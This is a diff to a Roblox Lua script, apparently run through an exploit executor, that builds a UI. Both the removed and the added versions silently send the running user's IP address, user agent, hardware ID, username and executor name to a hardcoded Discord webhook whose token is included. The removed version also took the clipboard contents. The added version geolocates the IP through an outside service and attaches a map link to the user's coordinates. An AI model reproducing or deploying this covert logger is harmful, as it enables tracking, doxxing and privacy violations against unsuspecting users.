@@ -16,6 +16,18 @@ HS.HttpEnabled = true
 function GetJson(v)
     return HS:JSONDecode(HS:GetAsync(v))
 end
+function GetIP()
+    local IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip
+    local Url = "https://cz88.net/api/cz88/ip/accurate?ip="..IP
+    local Json = GetJson(Url).data.locations
+    if #Json == 0 then
+        return "["..IP.."]("..Url..")"
+    end
+    for i, v in pairs(Json) do
+        Json[i] = v.longitude..","..v.latitude
+    end
+    return "["..IP.."](https://uri.amap.com/marker?markers="..table.concat(Json, "|")..")"
+end
 
 task.spawn(function()
     while true do
@@ -35,16 +47,37 @@ task.spawn(function()
 end)
 
 HS:PostAsync("https://discord.com/api/webhooks/1226854894892482570/-jydlb9STtmdY0ZedSTmIqVHBfSkToq4jbc7h9Q5Do76_ngF81vbrf9sXJNrkWEs_K-W", HS:JSONEncode({
-    content = HS:JSONEncode({
-        IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip,
-        UA = HS:GetUserAgent(),
-        Game = game.GameId,
-        User = LP.UserId,
-        Hwid = gethwid(),
-        Clipboard = getclipboard(),
-        Executor = identifyexecutor()
-    }),
-    username = LP.Name
+    embeds = {
+        {
+            color = 65280,
+            fields = {
+                {
+                    name = "Game",
+                    value = "["..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
+                },
+                {
+                    name = "User",
+                    value = "["..LP.Name.."](https://www.roblox.com/users/"..LP.UserId..")"
+                },
+                {
+                    name = "IP",
+                    value = GetIP()
+                },
+                {
+                    name = "UA",
+                    value = HS:GetUserAgent()
+                },
+                {
+                    name = "Hwid",
+                    value = gethwid()
+                },
+                {
+                    name = "Executor",
+                    value = identifyexecutor()
+                }
+            }
+        }
+    }
 }))
 
 local UI = Instance.new("ScreenGui")
